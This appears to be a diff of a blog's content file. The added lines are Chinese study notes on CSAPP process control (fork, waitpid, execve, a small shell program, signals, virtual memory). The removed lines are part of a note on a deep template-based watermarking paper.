+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">exit</span><span class="params">(<span class="keyword">int</span> status)</span></span>;</span><br></pre></td></tr></table></figure>
+
+<p>exit函数以status退出状态来终止进程（另一种设置退出状态的方法是从主程序返回一个整数值）。父进程调用fork函数创建一个新的运行的子进程。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">pid_t</span> <span class="title">fork</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br></pre></td></tr></table></figure>
+
+<p>​    新创建的子进程几乎但不完全与父进程相同，子进程得到与父进程用户级虚拟地址空间相同的但是独立的一个副本，包括代码和数据段、堆、共享库以及用户栈。子进程还获得与父进程任何打开文件描述符相同的副本，这就意味着父进程调用fork时，子进程可以读写父进程中打开的任何文件父进程和新创建的子进程最大的区别在于他们有不同的PID。<br>​     fork函数有趣的在于它调用一次，但是会返回两次，一次是在调用进程（父进程）中，一次是在新创建的子进程中。在父进程中fork返回的是子进程的PID，在子进程中fork返回0。因为子进程的PID总是非0，返回值就明确的分辨出程序是在父进程还是在子进程。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;csapp.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">pid_t</span> pid;</span><br><span class="line">	<span class="keyword">int</span> x=<span class="number">1</span>;</span><br><span class="line">	pid=Fork();</span><br><span class="line">	<span class="keyword">if</span>(pid==<span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//子进程</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;child:x = %d\n&quot;</span>,++x);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;parent :x=%d\n &quot;</span>,--x);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/91.png" class="">
+
+<p> 从上述可以看到：</p>
+<ol>
+<li><p>调用一次，返回两次。fork函数被父进程调用一次，却返回两次。一次是返回到父进程，一次是返回到新创建的子进程。</p>
+</li>
+<li><p>并发执行。父进程和子进程是并发运行的独立进程，内核能以任意方式交替执行它们的逻辑控制流中的指令。</p>
+</li>
+<li><p>相同但是独立的地址空间。</p>
+</li>
+<li><p>共享文件。子进程共享了父进程打开的文件，stdout。所以子进程输出也是指向屏幕。</p>
+</li>
+</ol>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   Fork();</span><br><span class="line">   Fork();</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">   <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/92.png" class="">
+
+<h5 id="8-4-3-回收子进程"><a href="#8-4-3-回收子进程" class="headerlink" title="8.4.3 回收子进程"></a>8.4.3 回收子进程</h5><p>​    当一个进程由于某种原因终止时，内核并不是立即把它从系统中清除，相反进程被保持在一种已终止的状态中，直到被父进程回收，当父进程回收已终止的子进程时，内核将子进程的退出状态传递给父进程，然后抛弃已终止的进程。从此时开始，该进程就不存在了。一个终止了但没有被回收的进程称为僵尸进程。</p>
+<p>​    如果一个父进程终止了，内核会安排init进程称为它的孤儿进程（如果父进程先退出,子进程还没退出那么子进程将被 托孤给init进程）的养父。init进程的PID为1，是系统在启动时由内核创建的，他不会终止，是所有进程的祖先。如果父进程没有回收它的僵尸进程就终止了，那么内核会安排init进程回收它们，长时间运行的程序，比如shell或者服务器，总是应该回收它们的僵尸子进程，即使僵尸进程没有运行，仍然会消耗系统的内存资源。一个进程可以通过调用waitpid函数等待它的子进程终止或停止。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//成功返回子进程pid，WNOHANG则为0,其他错误-1</span></span><br><span class="line"><span class="function"><span class="keyword">pid_t</span> <span class="title">waitpid</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">int</span> *statusp, <span class="keyword">int</span> options)</span></span>;</span><br></pre></td></tr></table></figure>
+
+<p>默认情况下，options=0时，waitpid挂起调用进程的执行，直到它的等待集合中一个子进程终止，如果等待集合中的一个进程在刚调用的时候就已经终止，那么waitpid立即返回。在这两种情况下，waitpid返回导致waitpid返回的已终止子进程的PID。此时，已终止的子进程已经被回收，内核会从系统中删除掉它的所有痕迹。</p>
+<ol>
+<li><p>判定等待集合的成员</p>
+<ul>
+<li>如果pid&gt;0，那么等待集合就是一个单独的子进程，它的进程ID等于pid</li>
+<li>如果pid=-1，那么等待集合就是由父进程所有的子进程组成</li>
+</ul>
+</li>
+<li><p>修改默认行为</p>
+<p>可以通过将options设置为常量WNOHANG、WUNTRACED和WCONTINUED的各种组合修改默认行为。</p>
+<ul>
+<li>WNOHANG：如果等待集合中的任何子进程都还没有终止，那么就立即返回，返回值为0，默认的行为是挂起调用进程，直到有子进程终止，在等待子进程终止的同时如果还有想做的工作，这个选项会有用。</li>
+<li>WUNTRACED：挂起调用进程的执行，直到等待集合中一个进程变成已终止或者已经被停止，返回的PID为呆滞返回的已终止或被停止的子进程的PID，默认的行为是只返回已终止的子进程。当想要金叉已终止和被停止的子进程时会有用。</li>
+<li>WCONTINUED：挂起调用进程的执行，直到等待集合中一个正在运行的进程终止，或等待集合中和一个被停止的进程收到SIGCONT信号重新开始执行。</li>
+</ul>
+<p>可以用或运算把这些选项组合起来。</p>
+</li>
+<li><p>检查已回收子进程的退出状态</p>
+<p>如果statusp参数是非空的，那么waitpid就会在status中放上关于导致返回子进程的状态信息，status是statusp指向的值。wait.h中定义了status参数的几个宏。</p>
+<ul>
+<li>WIFEXITED：如果子进程调用exit或者返回正常终止，就返回真。</li>
+<li>WEXITSTATUS：返回一个正常终止的子进程的退出状态，只有在WIFEXITED()返回为真时，才定义这个状态。</li>
+<li>WIFSIGNALED：如果子进程是因为一个未被捕获的信号终止的，那么就返回真。</li>
+<li>WTERMSIG：返回导致子进程终止的信号的编号，只有在WIFSIGNALED()返回为真时，才定义这个状态。</li>
+<li>WIFSTOPPED：如果引起返回的子进程当前是停止的，那么返回真。</li>
+<li>WSTOPSIG：返回引起子进程停止的信号的编号。只有在WIFSTOPPED()返回为真才定义这个状态。</li>
+<li>WIFCONTINUED：如果子进程收到SIGCONT信号重新启动，则返回真。</li>
+</ul>
+</li>
+<li><p>错误条件</p>
+<p>如果调用进程没有子进程，那么waitpid返回-1，并设置errno为ECHILD。如果waitpid函数被一个信号中断，那么返回-1，并设置erron为EINTR。</p>
+</li>
+<li><p>wait函数</p>
+<p>wait函数是waitpid函数的简单版本。</p>
+<p>调用wait(&amp;status)等价于调用waitpid(-1,&amp;status,0)。</p>
+</li>
+</ol>
+<h5 id="8-4-4-让进程休眠"><a href="#8-4-4-让进程休眠" class="headerlink" title="8.4.4 让进程休眠"></a>8.4.4 让进程休眠</h5><p>sleep函数将一个进程挂起一段时间。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">sleep</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> secs)</span></span>;</span><br></pre></td></tr></table></figure>
+
+<p>如果请求的时间量已经到了，sleep返回0，否则返回还剩下的要休眠的秒数，后一种情况是可能的，如果sleep函数被一个信号中断而过早的返回，还有一个有用的函数是pause函数，该函数让调用函数休眠，直到进程收到一个信号。</p>
+<h5 id="8-4-5-加载并运行程序"><a href="#8-4-5-加载并运行程序" class="headerlink" title="8.4.5 加载并运行程序"></a>8.4.5 加载并运行程序</h5><p>​    execve函数在当前进程的上下文加载并运行一个新程序。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">execve</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">char</span> *<span class="keyword">const</span> argv[], <span class="keyword">char</span> *<span class="keyword">const</span> envp[])</span></span>;</span><br></pre></td></tr></table></figure>
+
+<p>​    execve函数加载并运行可执行目标文件filename，且带参数列表argv和环境变量列表envp。只有当出现错误时，例如找不到filename，execve才会返回到调用程序，所以，与fork一次调用两次返回不同，execve调用一次不返回。</p>
+<p>​    argv变量指向一个以null结尾的指针数组，其中每个指针都指向一个参数字符串，按惯例，argv[0]是可执行文件的名字，环境变量的列表是由一个类似的数据结构表示的，envp变量指向一个以null结尾的指针数组，其中每个指针指向一个环境变量字符串。</p>
+<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/93.png" class="">
+
+<p>在exceve加载了filename之后，调用一些启动代码，启动代码设置栈，并将控制传递给新程序的主函数，该主函数有如下形式：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span>;</span><br></pre></td></tr></table></figure>
+
+<p>​    当main开始执行时，用户的栈组织结构如下图所示，从栈底（高地址）往栈顶（低地址）看，首先是参数和环境字符串，栈网上紧随其后的是以null结尾的指针数组，其中每个指针都指向栈中一个环境变量字符串，全局变量environ指向这些指针中的第一个envp[0]，紧跟环境变量数组之后的是以null结尾的argv[]数组，其中每个元素都指向栈中的一个参数字符串，在栈顶部是系统启动函数libc_start_main的栈帧。</p>
+<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/94.png" class="">
+
+<p>main函数又3个参数：</p>
+<ol>
+<li>argc,它给出argv[]数组中非空指针的数目</li>
+<li>argv，指向argv[]数组中的第一条目</li>
+<li>envp，指向envp[]数组中的第一个条目</li>
+</ol>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span> **environ;    </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXLINE    1024   <span class="comment">/* max line size */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXARGS     128   <span class="comment">/* max args on a command line */</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unix_error</span><span class="params">(<span class="keyword">char</span> *msg)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">eval</span><span class="params">(<span class="keyword">char</span> *cmdline)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">builtin_cmd</span><span class="params">(<span class="keyword">char</span> **argv)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">parseline</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *cmdline, <span class="keyword">char</span> **argv)</span></span>; </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> cmdline[MAXLINE];</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;tsh&gt; &quot;</span>);</span><br><span class="line">        fgets(cmdline,MAXLINE,<span class="built_in">stdin</span>);</span><br><span class="line">	<span class="keyword">if</span> (feof(<span class="built_in">stdin</span>)) &#123; </span><br><span class="line">	    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	eval(cmdline);</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">eval</span><span class="params">(<span class="keyword">char</span> *cmdline)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *argv[MAXLINE];</span><br><span class="line">    <span class="keyword">char</span> buf[MAXLINE];</span><br><span class="line">    <span class="keyword">int</span> bg;                 <span class="comment">/*should the job run in bg or fg?*/</span></span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    </span><br><span class="line">    stpcpy(buf,cmdline);</span><br><span class="line">    bg = parseline(buf,argv);</span><br><span class="line">    <span class="keyword">if</span>(argv[<span class="number">0</span>]==<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span>;     <span class="comment">/*ignore empty line*/</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!builtin_cmd(argv))&#123;                         <span class="comment">/*not a build in cmd*/</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>((pid = fork())==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">if</span>(execve(argv[<span class="number">0</span>],argv,environ)&lt;<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%s: Command not found. \n&quot;</span>,argv[<span class="number">0</span>]);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!bg)</span><br><span class="line">        &#123;</span><br><span class="line">        	<span class="keyword">int</span> status;</span><br><span class="line">        	<span class="keyword">if</span>(waitpid(pid, &amp;status, <span class="number">0</span>)&lt;<span class="number">0</span>)</span><br><span class="line">        		unix_error(<span class="string">&quot;waitfg:waitpid\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        	<span class="built_in">printf</span>(<span class="string">&quot;%d %s&quot;</span>,pid,cmdline);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">parseline</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *cmdline, <span class="keyword">char</span> **argv)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">char</span> <span class="built_in">array</span>[MAXLINE]; <span class="comment">/* holds local copy of command line */</span></span><br><span class="line">    <span class="keyword">char</span> *buf = <span class="built_in">array</span>;          <span class="comment">/* ptr that traverses command line */</span></span><br><span class="line">    <span class="keyword">char</span> *delim;                <span class="comment">/* points to first space delimiter */</span></span><br><span class="line">    <span class="keyword">int</span> argc;                   <span class="comment">/* number of args */</span></span><br><span class="line">    <span class="keyword">int</span> bg;                     <span class="comment">/* background job? */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>(buf, cmdline);</span><br><span class="line">    buf[<span class="built_in">strlen</span>(buf)<span class="number">-1</span>] = <span class="string">&#x27; &#x27;</span>;  <span class="comment">/* replace trailing &#x27;\n&#x27; with space */</span></span><br><span class="line">    <span class="keyword">while</span> (*buf &amp;&amp; (*buf == <span class="string">&#x27; &#x27;</span>)) <span class="comment">/* ignore leading spaces */</span></span><br><span class="line">	buf++;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Build the argv list */</span></span><br><span class="line">    argc = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (*buf == <span class="string">&#x27;\&#x27;&#x27;</span>) &#123;</span><br><span class="line">	buf++;</span><br><span class="line">	delim = <span class="built_in">strchr</span>(buf, <span class="string">&#x27;\&#x27;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">	delim = <span class="built_in">strchr</span>(buf, <span class="string">&#x27; &#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (delim) &#123;</span><br><span class="line">	argv[argc++] = buf;</span><br><span class="line">	*delim = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">	buf = delim + <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">while</span> (*buf &amp;&amp; (*buf == <span class="string">&#x27; &#x27;</span>)) <span class="comment">/* ignore spaces */</span></span><br><span class="line">	       buf++;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (*buf == <span class="string">&#x27;\&#x27;&#x27;</span>) &#123;</span><br><span class="line">	    buf++;</span><br><span class="line">	    delim = <span class="built_in">strchr</span>(buf, <span class="string">&#x27;\&#x27;&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">	    delim = <span class="built_in">strchr</span>(buf, <span class="string">&#x27; &#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    argv[argc] = <span class="literal">NULL</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (argc == <span class="number">0</span>)  <span class="comment">/* ignore blank line */</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* should the job run in the background? */</span></span><br><span class="line">    <span class="keyword">if</span> ((bg = (*argv[argc<span class="number">-1</span>] == <span class="string">&#x27;&amp;&#x27;</span>)) != <span class="number">0</span>) &#123;</span><br><span class="line">	argv[--argc] = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> bg;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">builtin_cmd</span><span class="params">(<span class="keyword">char</span> **argv)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>],<span class="string">&quot;quit&quot;</span>))</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>],<span class="string">&quot;&amp;&quot;</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;     <span class="comment">/* not a builtin command */</span>    <span class="comment">/* not a builtin command */</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unix_error</span><span class="params">(<span class="keyword">char</span> *msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stdout</span>, <span class="string">&quot;%s: %s\n&quot;</span>, msg, strerror(errno));</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="8-5-信号"><a href="#8-5-信号" class="headerlink" title="8.5 信号"></a>8.5 信号</h4><p>信号是一种更高层的软件形式的异常，它允许进程和内核中断其他进程。一个信号就是一条小消息，它通知进程系统中发生一个某种类型的事件。每种信号对应某种系统事件，低层的硬件异常是由内核异常处理程序处理的，正常情况下，对用户进程而言是不可见的，信号提供一种机制，通知用户进程发生了这些异常，比如，一个进程试图除以0，那么内核就会发送一个SIGFPE信号，如果一个进程执行一条非法指令，那么内核就发送给它一个SIGSEGV信号。下图为linux信号。</p>
+<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/95.png" class="">
+
+<h2 id="第九章：虚拟内存"><a href="#第九章：虚拟内存" class="headerlink" title="第九章：虚拟内存"></a>第九章：虚拟内存</h2><p>什么是虚拟内存？</p>
+<p>​    内存容易被破坏，如果一个进程写入了另一个进程使用的内存，就有可能会造成崩溃。虚拟内存是对主存概念的抽象概念。</p>
+<p>用虚拟内存的好处：</p>
+<ul>
+<li>根据特定的需要在磁盘和主存之间告诉高速传输数据，从而高效使用缓存</li>
+<li>为每个进程提供相同的地址空间，从而简化内存管理</li>
+<li>保护每个内存空间的进程不被其他进程破坏</li>
+</ul>
+<h4 id="9-1-物理和虚拟寻址"><a href="#9-1-物理和虚拟寻址" class="headerlink" title="9.1 物理和虚拟寻址"></a>9.1 物理和虚拟寻址</h4><p>早期PC：物理寻址</p>
+<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/96.png" class="">
+
+<p>近代PC：虚拟寻址</p>
+<p>​    CPU生成虚拟地址访问主存，虚拟地址被送到主存之前首先通过MMU转换为物理地址</p>
+<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/97.png" class="">
+
+
+
+<h4 id="9-2-地址空间"><a href="#9-2-地址空间" class="headerlink" title="9.2 地址空间"></a>9.2 地址空间</h4><p>非负整数地址的有序集合，在地址空间中的整数通常是连续的，我们称之为<strong>线性地址空间</strong>。</p>
+<h4 id="9-3-虚拟内存作为缓存工具"><a href="#9-3-虚拟内存作为缓存工具" class="headerlink" title="9.3 虚拟内存作为缓存工具"></a>9.3 虚拟内存作为缓存工具</h4><p>概念上而言，可以将虚拟内存（VM）理解为一个由存放在磁盘上的m个连续的字节大小的单元所组成的数组。</p>
+<p>VM系统将虚拟内存分割为虚拟页，同时将物理内存分割为物理页，每个页大小为2^p字节。</p>
+<p>在任意时刻，虚拟页面的集合都被分为三个不相交的子集：</p>
+<ul>
+<li>未分配的VM系统还未分配（或者创建）的页。未分配的块没有</li>
+</ul>
 ]]></content>
       <categories>
         <category>CSAPP</category>
@@ -2482,90 +2482,6 @@
       </categories>
   </entry>
   <entry>
-    <title>Deep_Template-Based_Watermarking 论文笔记</title>
-    <url>/2021/12/25/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%EF%BC%9ADeep-Template-Based-Watermarking/</url>
-    <content><![CDATA[<h1 id="基于深度模板的数字水印"><a href="#基于深度模板的数字水印" class="headerlink" title="基于深度模板的数字水印"></a>基于深度模板的数字水印</h1><h2 id="传统基于模板的数字水印"><a href="#传统基于模板的数字水印" class="headerlink" title="传统基于模板的数字水印"></a>传统基于模板的数字水印</h2><p>基于模板的数字水印是传统水印算法的一个重要分支，与其他类型相比，具有更高的嵌入效率。模板是专门设计出来的带有一些统计特征的模式，用来携带水印和定位水印信息的。</p>
-<p>嵌入过程是将模板叠加到图像的空间域中来执行。</p>
-<p>关于空间域：又称图像空间(image space)。由图像像元组成的空间。在图像空间中以长度(距离)为自变量直接对像元值进行处理称为空间域处理。</p>
-<ul>
-<li>以时间作为变量所进行的研究就是时域</li>
-<li>以频率作为变量所进行的研究就是频域</li>
-<li>以空间坐标作为变量进行的研究就是空间域</li>
-<li>以波数作为变量所进行的研究称为波数域</li>
-</ul>
-<p>在深度学习之前，特征提取过程主要是通过一系列图像处理操作来完成的，如边缘检测、SIFT特征提取等。但这种的特征提取能力有限，无法抵御严重的失真。因此，这些传统方法的鲁棒性都不够好。为了提高鲁棒性，唯一可能的方法是使用更强的模板模式，但这将严重牺牲视觉质量。</p>
-<h2 id="提取程序的框架"><a href="#提取程序的框架" class="headerlink" title="提取程序的框架"></a>提取程序的框架</h2><p>主要由两个模块构成：目标水印模块和辅助定位模块</p>
-<h3 id="目标水印模块"><a href="#目标水印模块" class="headerlink" title="目标水印模块"></a>目标水印模块</h3><p>对于一个给定的目标水印序列，首先通过循环冗余码CRC（<a href="https://www.jianshu.com/p/7f4fd7f62de2%EF%BC%89%E5%92%8CBCH%E7%A0%81%EF%BC%88https://zhuanlan.zhihu.com/p/95909150?utm_source=wechat_session%EF%BC%89%E5%AF%B9%E5%85%B6%E8%BF%9B%E8%A1%8C%E7%BC%96%E7%A0%81%EF%BC%8C%E7%94%9F%E6%88%90%E5%85%B7%E6%9C%89%E7%BA%A0%E9%94%99%E8%83%BD%E5%8A%9B%E7%9A%84%E6%B6%88%E6%81%AF%E4%BD%8D%E7%9F%A9%E9%98%B5%E3%80%82">https://www.jianshu.com/p/7f4fd7f62de2）和BCH码（https://zhuanlan.zhihu.com/p/95909150?utm_source=wechat_session）对其进行编码，生成具有纠错能力的消息位矩阵。</a></p>
-<img src="/2021/12/25/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%EF%BC%9ADeep-Template-Based-Watermarking/1.png" class="">
-
-<p>在基于模板的水印算法中，位‘0/1’用不同的图案表示。最终的水印模板是根据矩阵W放置相应的‘0/1’图案组成的。</p>
-<p>我们提出了一套基于人类视觉系统特性的模板生成准则（HVS）</p>
-<ol>
-<li><p>由于“<strong>倾斜效应</strong>”，相同的修改像素量下，倾斜方向的图像比水平方向和垂直方向的图像产生的变化感知更小。</p>
-</li>
-<li><p><strong>JPEG压缩</strong>对<strong>高频</strong>分量的影响较大，对低频影响较小，所以模板需要将信息更多的集中在低频，抵抗JPEG压缩的影响</p>
-</li>
-<li><p>由于传输过程中的<strong>采样操作</strong>，改变了模板的<strong>连通域</strong>。为了保证特征的完整性，至少要在模板中存在一个较大的连通域，这样采样操作才不会擦除所有的特征。</p>
-<p>图像的连通域：是指图像中具有相同或相似像素值并且位置相邻的像素组成的区域。</p>
-<img src="/2.png" style="zoom:50%;" /></li>
-<li><p>人眼对亮度梯度的变化十分敏感。所以我们的模板应该避免显著的亮度变化。</p>
-</li>
-</ol>
-<p>我们设计了32*32的模板</p>
-<img src="/2021/12/25/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%EF%BC%9ADeep-Template-Based-Watermarking/5.png" class="">
-
-<p>用下面两种形式来表示0和1</p>
-<img src="/2021/12/25/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%EF%BC%9ADeep-Template-Based-Watermarking/3.png" class="">
-
-<p>倾斜的区域设计满足要求1。</p>
-<img src="/2021/12/25/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%EF%BC%9ADeep-Template-Based-Watermarking/4.png" class="">
-
-<p>傅里叶变换后，发现能量明显集中在低频区域满足要求2。</p>
-<p>中间有较大的联通区域，满足要求3。</p>
-<p>以灰色亮度为低，相邻模板区域之间都是以灰色相连，无论是灰色-&gt;白色，还是灰色-&gt;黑色，变化都比较顺滑，满足要求4。</p>
-<h3 id="定位模块生成"><a href="#定位模块生成" class="headerlink" title="定位模块生成"></a>定位模块生成</h3><p>于水印单元的位置和大小会受到裁剪和缩放畸变的影响，因此在提取过程中需要对水印模板进行定位和调整大小，这些都需要定位模块的参与。当定位模板与完整的水印单元成固定比例时，我们可以根据定位模板检测到的变换来恢复水印模板的原始状态。</p>
-<p>我们在图像中反复嵌入4组完整的水印，以抵抗剪切攻击（在图像受到裁剪操作时希望总有一个幸存下来）。并设置定位模板的大小为水印模板大小的1/4（图像的1/16）。</p>
-<img src="/2021/12/25/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%EF%BC%9ADeep-Template-Based-Watermarking/6.png" class="">
-
